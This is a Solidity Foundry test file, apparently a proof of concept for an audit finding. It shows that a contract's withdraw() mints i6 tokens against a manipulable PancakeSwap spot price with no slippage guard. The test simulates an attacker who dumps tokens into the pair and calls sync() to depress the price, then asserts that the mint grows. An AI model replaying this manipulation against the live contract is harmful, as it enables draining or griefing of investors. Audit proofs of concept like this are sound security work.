// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../BaseFork.t.sol";

/// @title SpotPriceMintTest -- PoC for AUDIT finding C-1
/// @notice withdraw() mints i6 against the raw PancakeSwap spot price with no
///         caller-side slippage guard (no `minTokensOut`). When pool reserves
///         are skewed (or skewed by an attacker frontrun), the mint amount
///         scales with `(usdtAmount * WAD) / spotPrice` and explodes once
///         spot collapses. This test reproduces that under a controlled
///         fresh-deploy scenario on the BSC fork.
contract SpotPriceMintTest is BaseForkSetup {

    address inv;

    function setUp() public override {
        super.setUp();
        _deployFreshSystem(1_000_000 * WAD, 1_000_000 * WAD); // spot ~ 1 USDT/i6
        inv = makeAddr("victimInvestor");
        // Invest 500 USDT under ORIGIN so we accumulate ROI to withdraw later.
        _investFresh(inv, 500 * WAD, freshOrigin);
        // Mature 30 days so ROI > 0.
        _advanceTime(30 days);
        // Cooldown-safe: ensure withdraw is callable.
        _advanceTime(1 hours + 1);
    }

    function test_C1_withdraw_mints_proportional_to_spot_collapse() public {
        // 1. Baseline withdraw at ~1 USDT/i6.
        uint256 spotBefore = freshSystem.getSpotPrice();
        uint256 mintedBalanceBefore = freshToken.balanceOf(inv);
        _withdrawFresh(inv);
        uint256 mintedBaseline = freshToken.balanceOf(inv) - mintedBalanceBefore;
        emit log_named_string("Spot price BEFORE manipulation", _toUsdt(spotBefore));
        emit log_named_string("i6 minted to investor (baseline)", _toI6(mintedBaseline));

        // Reset state so the next withdraw runs on a fresh maturity window
        // but with a manipulated pool.
        // Re-invest to keep position active, mature again.
        _investFresh(inv, 500 * WAD, freshOrigin);
        _advanceTime(30 days);
        _advanceTime(1 hours + 1);

        // 2. Attacker manipulates spot price downward by dumping i6 into the
        // pool. Buying is closed, so the attacker permanently loses tokens,
        // but they may not care -- they are griefing, not arbitraging.
        // Easiest: directly transfer i6 + sync().
        deal(address(freshToken), attacker, 5_000_000 * WAD);
        vm.startPrank(attacker, attacker);
        freshToken.transfer(freshPairAddr, 5_000_000 * WAD);
        freshPair.sync();
        vm.stopPrank();

        uint256 spotAfter = freshSystem.getSpotPrice();
        emit log_named_string("Spot price AFTER manipulation", _toUsdt(spotAfter));
        assertLt(spotAfter, spotBefore, "manipulation should drop spot price");

        uint256 mintedBalanceBefore2 = freshToken.balanceOf(inv);
        _withdrawFresh(inv);
        uint256 mintedManipulated = freshToken.balanceOf(inv) - mintedBalanceBefore2;
        emit log_named_string("i6 minted to investor (manipulated)", _toI6(mintedManipulated));

        // The whole point: mint grew inversely with spot price.
        emit log_named_uint("Mint multiplier (manipulated / baseline)",
            mintedManipulated / (mintedBaseline == 0 ? 1 : mintedBaseline));

        assertGt(mintedManipulated, mintedBaseline,
            "PoC: depressed spot price mints MORE tokens for the same USDT reward value");
    }

    function test_C1_no_minTokensOut_parameter_exposed() public {
        // Documentation-style assertion: the withdraw() function in the live
        // contract takes ZERO arguments. There is no way for the user to
        // assert a minimum mint amount. This is the missing slippage guard.
        bytes4 sel = bytes4(keccak256("withdraw()"));
        assertEq(sel, bytes4(0x3ccfd60b),
            "withdraw() has zero arguments -- no slippage guard is exposed");
    }
}
